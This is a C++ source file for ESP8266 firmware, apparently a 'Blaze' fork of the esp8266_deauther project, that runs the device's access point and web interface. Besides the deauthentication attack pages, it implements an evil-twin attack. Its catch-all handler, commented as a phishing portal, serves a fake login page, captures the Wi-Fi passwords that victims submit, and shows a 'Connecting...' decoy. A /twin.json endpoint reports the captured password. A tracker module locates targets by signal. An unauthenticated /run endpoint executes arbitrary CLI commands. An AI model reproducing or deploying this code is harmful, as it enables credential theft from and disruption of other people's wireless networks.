/* This software is licensed under the MIT License: https://github.com/spacehuhntech/esp8266_deauther */

#include "wifi.h"

extern "C" {
    #include "user_interface.h"
}

#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <LittleFS.h>

#include "language.h"
#include "debug.h"
#include "settings.h"
#include "CLI.h"
#include "Attack.h"
#include "Scan.h"
#include "DisplayUI.h"
#include "BlazeTracker.h"
#include "BlazeMood.h"
#include "BlazeEvilTwin.h"
#include "src/ArduinoJson-v5.13.5/ArduinoJson.h"

extern DisplayUI displayUI;

extern bool progmemToSpiffs(const char* adr, int len, String path);

#include "webfiles.h"

extern Scan   scan;
extern CLI    cli;
extern Attack attack;

typedef enum wifi_mode_t {
    off = 0,
    ap  = 1,
    st  = 2
} wifi_mode_t;

typedef struct ap_settings_t {
    char    path[33];
    char    ssid[33];
    char    password[65];
    uint8_t channel;
    bool    hidden;
    bool    captive_portal;
} ap_settings_t;

namespace wifi {
    // ===== PRIVATE ===== //
    wifi_mode_t   mode;
    ap_settings_t ap_settings;

    // Server and other global objects
    ESP8266WebServer server(80);
    DNSServer dns;
    IPAddress ip WEB_IP_ADDR;
    IPAddress    netmask(255, 255, 255, 0);

    void setPath(String path) {
        if (path.charAt(0) != '/') {
            path = '/' + path;
        }

        if (path.length() > 32) {
            debuglnF("ERROR: Path longer than 32 characters");
        } else {
            strncpy(ap_settings.path, path.c_str(), 32);
        }
    }

    void setSSID(String ssid) {
        if (ssid.length() > 32) {
            debuglnF("ERROR: SSID longer than 32 characters");
        } else {
            strncpy(ap_settings.ssid, ssid.c_str(), 32);
        }
    }

    void setPassword(String password) {
        if (password.length() > 64) {
            debuglnF("ERROR: Password longer than 64 characters");
        } else if (password.length() < 8) {
            debuglnF("ERROR: Password must be at least 8 characters long");
        } else {
            strncpy(ap_settings.password, password.c_str(), 64);
        }
    }

    void setChannel(uint8_t ch) {
        if ((ch < 1) && (ch > 14)) {
            debuglnF("ERROR: Channel must be withing the range of 1-14");
        } else {
            ap_settings.channel = ch;
        }
    }

    void setHidden(bool hidden) {
        ap_settings.hidden = hidden;
    }

    void setCaptivePortal(bool captivePortal) {
        ap_settings.captive_portal = captivePortal;
    }

    void handleFileList() {
        if (!server.hasArg("dir")) {
            server.send(500, str(W_TXT), str(W_BAD_ARGS));
            return;
        }

        String path = server.arg("dir");
        // debugF("handleFileList: ");
        // debugln(path);

        Dir dir = LittleFS.openDir(path);

        String output = String('{'); // {
        File   entry;
        bool   first = true;

        while (dir.next()) {
            entry = dir.openFile("r");

            if (first) first = false;
            else output += ',';                 // ,

            output += '[';                      // [
            output += '"' + entry.name() + '"'; // "filename"
            output += ']';                      // ]

            entry.close();
        }

        output += CLOSE_BRACKET;
        server.send(200, str(W_JSON).c_str(), output);
    }

    String getContentType(String filename) {
        if (server.hasArg("download")) return String(F("application/octet-stream"));
        else if (filename.endsWith(str(W_DOT_GZIP))) filename = filename.substring(0, filename.length() - 3);
        else if (filename.endsWith(str(W_DOT_HTM))) return str(W_HTML);
        else if (filename.endsWith(str(W_DOT_HTML))) return str(W_HTML);
        else if (filename.endsWith(str(W_DOT_CSS))) return str(W_CSS);
        else if (filename.endsWith(str(W_DOT_JS))) return str(W_JS);
        else if (filename.endsWith(str(W_DOT_PNG))) return str(W_PNG);
        else if (filename.endsWith(str(W_DOT_GIF))) return str(W_GIF);
        else if (filename.endsWith(str(W_DOT_JPG))) return str(W_JPG);
        else if (filename.endsWith(str(W_DOT_ICON))) return str(W_ICON);
        else if (filename.endsWith(str(W_DOT_XML))) return str(W_XML);
        else if (filename.endsWith(str(W_DOT_PDF))) return str(W_XPDF);
        else if (filename.endsWith(str(W_DOT_ZIP))) return str(W_XZIP);
        else if (filename.endsWith(str(W_DOT_JSON))) return str(W_JSON);
        return str(W_TXT);
    }

    bool handleFileRead(String path) {
        // prnt(W_AP_REQUEST);
        // prnt(path);

        if (path.charAt(0) != '/') path = '/' + path;
        if (path.charAt(path.length() - 1) == '/') path += String(F("index.html"));

        String contentType = getContentType(path);

        if (!LittleFS.exists(path)) {
            if (LittleFS.exists(path + str(W_DOT_GZIP))) path += str(W_DOT_GZIP);
            else if (LittleFS.exists(String(ap_settings.path) + path)) path = String(ap_settings.path) + path;
            else if (LittleFS.exists(String(ap_settings.path) + path + str(W_DOT_GZIP))) path = String(ap_settings.path) + path + str(W_DOT_GZIP);
            else {
                // prntln(W_NOT_FOUND);
                return false;
            }
        }

        File file = LittleFS.open(path, "r");

        server.streamFile(file, contentType);
        file.close();
        // prnt(SPACE);
        // prntln(W_OK);

        return true;
    }

    void sendProgmem(const char* ptr, size_t size, const char* type) {
        server.sendHeader("Content-Encoding", "gzip");
        server.sendHeader("Cache-Control", "max-age=3600");
        server.send_P(200, str(type).c_str(), ptr, size);
    }

    String blazeJsonEscape(const String& s) {
        String out;
        out.reserve(s.length() + 8);
        for (uint32_t i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c == '"')       out += "\\\"";
            else if (c == '\\') out += "\\\\";
            else if (c == '\n') out += "\\n";
            else if (c == '\r') continue;
            else if (c == '\t') out += "\\t";
            else if ((uint8_t)c >= 32) out += c; // keep UTF-8 bytes
        }
        return out;
    }

    // ===== PUBLIC ====== //
    void begin() {
        // Set settings
        setPath("/web");
        setSSID(settings::getAccessPointSettings().ssid);
        setPassword(settings::getAccessPointSettings().password);
        setChannel(settings::getWifiSettings().channel);
        setHidden(settings::getAccessPointSettings().hidden);
        setCaptivePortal(settings::getWebSettings().captive_portal);

        // copy web files to SPIFFS
        if (settings::getWebSettings().use_spiffs) {
            copyWebFiles(false);
        }

        // Set mode
        mode = wifi_mode_t::off;
        WiFi.mode(WIFI_OFF);
        wifi_set_opmode(STATION_MODE);

        // Set mac address
        wifi_set_macaddr(STATION_IF, (uint8_t*)settings::getWifiSettings().mac_st);
        wifi_set_macaddr(SOFTAP_IF, (uint8_t*)settings::getWifiSettings().mac_ap);
    }

    String getMode() {
        switch (mode) {
            case wifi_mode_t::off:
                return "OFF";
            case wifi_mode_t::ap:
                return "AP";
            case wifi_mode_t::st:
                return "ST";
            default:
                return String();
        }
    }

    void printStatus() {
        prnt(String(F("[WiFi] Path: '")));
        prnt(ap_settings.path);
        prnt(String(F("', Mode: '")));
        prnt(getMode());
        prnt(String(F("', SSID: '")));
        prnt(ap_settings.ssid);
        prnt(String(F("', password: '")));
        prnt(ap_settings.password);
        prnt(String(F("', channel: '")));
        prnt(ap_settings.channel);
        prnt(String(F("', hidden: ")));
        prnt(b2s(ap_settings.hidden));
        prnt(String(F(", captive-portal: ")));
        prntln(b2s(ap_settings.captive_portal));
    }

    void startNewAP(String path, String ssid, String password, uint8_t ch, bool hidden, bool captivePortal) {
        setPath(path);
        setSSID(ssid);
        setPassword(password);
        setChannel(ch);
        setHidden(hidden);
        setCaptivePortal(captivePortal);

        startAP();
    }

    /*
        void startAP(String path) {
            setPath(path):

            startAP();
        }
     */
    void startAP() {
        WiFi.softAPConfig(ip, ip, netmask);
        WiFi.softAP(ap_settings.ssid, ap_settings.password, ap_settings.channel, ap_settings.hidden);

        dns.setErrorReplyCode(DNSReplyCode::NoError);
        dns.start(53, "*", ip);

        MDNS.begin(WEB_URL);

        server.on("/list", HTTP_GET, handleFileList); // list directory

        #ifdef USE_PROGMEM_WEB_FILES
        // ================================================================
        // paste here the output of the webConverter.py
        if (!settings::getWebSettings().use_spiffs) {
            server.on("/", HTTP_GET, []() {
                sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
            });
            server.on("/index.html", HTTP_GET, []() {
                sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
            });
            server.on("/scan.html", HTTP_GET, []() {
                sendProgmem(scanhtml, sizeof(scanhtml), W_HTML);
            });
            server.on("/info.html", HTTP_GET, []() {
                sendProgmem(infohtml, sizeof(infohtml), W_HTML);
            });
            server.on("/ssids.html", HTTP_GET, []() {
                sendProgmem(ssidshtml, sizeof(ssidshtml), W_HTML);
            });
            server.on("/attack.html", HTTP_GET, []() {
                sendProgmem(attackhtml, sizeof(attackhtml), W_HTML);
            });
            server.on("/settings.html", HTTP_GET, []() {
                sendProgmem(settingshtml, sizeof(settingshtml), W_HTML);
            });
            server.on("/login.html", HTTP_GET, []() {
                sendProgmem(loginhtml, sizeof(loginhtml), W_HTML);
            });
            server.on("/tracker.html", HTTP_GET, []() {
                sendProgmem(trackerhtml, sizeof(trackerhtml), W_HTML);
            });
            server.on("/twin.html", HTTP_GET, []() {
                sendProgmem(twinhtml, sizeof(twinhtml), W_HTML);
            });
            server.on("/js/blaze.js", HTTP_GET, []() {
                sendProgmem(blazejs, sizeof(blazejs), W_JS);
            });
            server.on("/js/tracker.js", HTTP_GET, []() {
                sendProgmem(trackerjs, sizeof(trackerjs), W_JS);
            });
            server.on("/style.css", HTTP_GET, []() {
                sendProgmem(stylecss, sizeof(stylecss), W_CSS);
            });
            server.on("/js/ssids.js", HTTP_GET, []() {
                sendProgmem(ssidsjs, sizeof(ssidsjs), W_JS);
            });
            server.on("/js/site.js", HTTP_GET, []() {
                sendProgmem(sitejs, sizeof(sitejs), W_JS);
            });
            server.on("/js/attack.js", HTTP_GET, []() {
                sendProgmem(attackjs, sizeof(attackjs), W_JS);
            });
            server.on("/js/scan.js", HTTP_GET, []() {
                sendProgmem(scanjs, sizeof(scanjs), W_JS);
            });
            server.on("/js/settings.js", HTTP_GET, []() {
                sendProgmem(settingsjs, sizeof(settingsjs), W_JS);
            });
            server.on("/js/twin.js", HTTP_GET, []() {
                sendProgmem(twinjs, sizeof(twinjs), W_JS);
            });
            server.on("/lang/en.lang", HTTP_GET, []() {
                sendProgmem(enlang, sizeof(enlang), W_JSON);
            });
        }
        server.on("/lang/default.lang", HTTP_GET, []() {
            if (!settings::getWebSettings().use_spiffs) {
                sendProgmem(enlang, sizeof(enlang), W_JSON);
            } else {
                handleFileRead("/web/lang/en.lang");
            }
        });
        // ================================================================
        #endif /* ifdef USE_PROGMEM_WEB_FILES */

        server.on("/run", HTTP_GET, []() {
            server.send(200, str(W_TXT), str(W_OK).c_str());
            String input = server.arg("cmd");
            cli.exec(input);
        });

        server.on("/attack.json", HTTP_GET, []() {
            server.send(200, str(W_JSON), attack.getStatusJSON());
        });

        // ===== BLAZE endpoints =====
        server.on("/blaze/status", HTTP_GET, []() {
            String json = "{\"scan\":";
            json += scan.isScanning() ? "true" : "false";
            json += ",\"attack\":";
            json += attack.isRunning() ? "true" : "false";
            json += ",\"twin\":";
            json += BlazeEvilTwin::active() ? "true" : "false";
            json += ",\"track\":";
            json += BlazeTracker::active() ? "true" : "false";
            json += ",\"mood\":\"" + String(BlazeMood::name()) + "\"}";
            server.send(200, str(W_JSON), json);
        });

        server.on("/twin", HTTP_GET, []() {
            String cmd = server.arg("cmd");
            String json;
            if (cmd == "start") {
                int ap = server.arg("ap").toInt();
                bool ok = BlazeEvilTwin::start(ap);
                json = "{\"ok\":";
                json += ok ? "true" : "false";
                json += "}";
            } else if (cmd == "stop") {
                BlazeEvilTwin::stop();
                json = "{\"ok\":true}";
            } else {
                json = "{\"ok\":true}";
            }
            server.send(200, str(W_JSON), json);
        });

        server.on("/twin.json", HTTP_GET, []() {
            String j = "{\"active\":";
            j += BlazeEvilTwin::active() ? "true" : "false";
            j += ",\"ssid\":\"" + blazeJsonEscape(BlazeEvilTwin::targetSsid()) + "\"";
            j += ",\"password\":\"" + blazeJsonEscape(BlazeEvilTwin::captured()) + "\"";
            j += ",\"attempts\":" + String(BlazeEvilTwin::attempts());
            j += "}";
            server.send(200, str(W_JSON), j);
        });

        server.on("/blaze/loginfail", HTTP_POST, []() {
            displayUI.flashNoLogin(); // shows "NOO!!" face flash
            server.send(200, str(W_JSON), "{\"ok\":true}");
        });

        // ===== BLAZE tracker =====
        server.on("/blaze/tracker", HTTP_GET, []() {
            server.send(200, str(W_JSON), BlazeTracker::toJson());
        });

        server.on("/blaze/track", HTTP_POST, []() {
            DynamicJsonBuffer jsonBuffer;
            JsonObject& root = jsonBuffer.parseObject(server.arg("plain"));
            if (root.success()) {
                if (root.containsKey("on")) {
                    bool on = root["on"];
                    if (on) {
                        int  t  = root.containsKey("target") ? (int)root["target"] : -1;
                        bool ok = false;
                        if (!(BlazeTracker::active() && t < 0)) {
                            ok = (t >= 0) ? BlazeTracker::start(t) : BlazeTracker::startBest();
                        } else {
                            ok = true;
                        }
                        if (ok) displayUI.mode = DISPLAY_MODE::TRACKER;
                    } else {
                        BlazeTracker::stop();
                    }
                }
                if (root.containsKey("env")) {
                    const char* e = root["env"];
                    if (e) BlazeTracker::setEnvName(String(e));
                }
                if (root.containsKey("txp")) {
                    float t = root["txp"];
                    BlazeTracker::setTxPower(t);
                }
                if (root.containsKey("calibrate") && (bool)root["calibrate"]) {
                    BlazeTracker::doCalibrate();
                }
            }
            server.send(200, str(W_JSON), BlazeTracker::toJson());
        });

        // called when the url is not defined here
        // use it to load content from SPIFFS
        server.onNotFound([]() {
            // evil twin: serve phishing portal for any unknown URL
            if (BlazeEvilTwin::servePortal()) {
                if (server.method() == HTTP_POST) {
                    String pw = server.arg("p");
                    if (pw.length() == 0 && server.hasArg("plain")) {
                        // try form body
                        pw = server.arg("plain");
                    }
                    if (pw.length() > 0) BlazeEvilTwin::submitPassword(pw);
                    server.send(200, "text/html", F("<!DOCTYPE html><meta charset=utf-8><title>Connecting...</title><body style='background:#0a0a0a;color:#39ff14;font-family:monospace;text-align:center;padding:40px'><h2>Connecting...</h2><p>Please wait</p></body>"));
                    return;
                }
                server.send(200, "text/html", BlazeEvilTwin::portalHtml());
                return;
            }
            if (!handleFileRead(server.uri())) {
                if (settings::getWebSettings().captive_portal) sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
                else server.send(404, str(W_TXT), str(W_FILE_NOT_FOUND));
            }
        });

        server.begin();
        mode = wifi_mode_t::ap;

        prntln(W_STARTED_AP);
        printStatus();
    }

    void stopAP() {
        if (mode == wifi_mode_t::ap) {
            wifi_promiscuous_enable(0);
            WiFi.persistent(false);
            WiFi.disconnect(true);
            wifi_set_opmode(STATION_MODE);
            prntln(W_STOPPED_AP);
            mode = wifi_mode_t::st;
        }
    }

    void resumeAP() {
        if (mode != wifi_mode_t::ap) {
            mode = wifi_mode_t::ap;
            wifi_promiscuous_enable(0);
            WiFi.softAPConfig(ip, ip, netmask);
            WiFi.softAP(ap_settings.ssid, ap_settings.password, ap_settings.channel, ap_settings.hidden);
            prntln(W_STARTED_AP);
        }
    }

    void update() {
        if ((mode != wifi_mode_t::off) && !scan.isScanning()) {
            server.handleClient();
            dns.processNextRequest();
        }
    }
}